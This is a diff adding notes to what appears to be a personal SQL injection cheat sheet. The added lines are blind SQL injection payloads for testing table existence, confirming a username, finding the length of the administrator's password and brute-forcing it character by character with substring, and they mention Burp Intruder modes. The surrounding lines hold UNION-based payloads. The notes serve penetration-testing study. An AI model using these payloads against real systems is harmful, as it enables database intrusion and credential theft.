@@ -99,6 +99,17 @@ To automate the process, use the following tools
 -     ?id=2' order by n --+
 -     ?id=2' union select null,null,'text',null,n-1 --+
 -     ?id=2' union select 1,version(),database(),user() --+
+- Blind SQLI with conditional response - you can't use UNION in blind sqli
+-     ?id=2' and 1 = 0 --+
+- to check whether <TableName> exits or not in Blind SQLI
+-     ' and (select 'x' from <TableName> LIMIT 1)='x' --+
+- confirm <UserName> exits in the <TableName>
+-     ' and (select <ColumnName> from <TableName> where <ColumnName>='<UserName>')='<UserName>' --+
+-     ' and (select 'x' from users where username='administrator' LIMIT+1)='x'+--+
+- check the length of the password in blind sqli // can be done manually as well as using intruder
+-     ' and (select username from users where username='administrator' and LENGTH (password)>=20)='administrator' --+
+- user substring function to brute force  send it to the intruder and choose (sniper with payload type brute forcer) or (cluster bomb)
+-     ' and (select substring(password,1,1) from users where username='administrator')='a' --+
 - return data in blind SQL injection
 -     select substring('RAMAN',1,1)='R'; --> True
 - Evasion Techniques
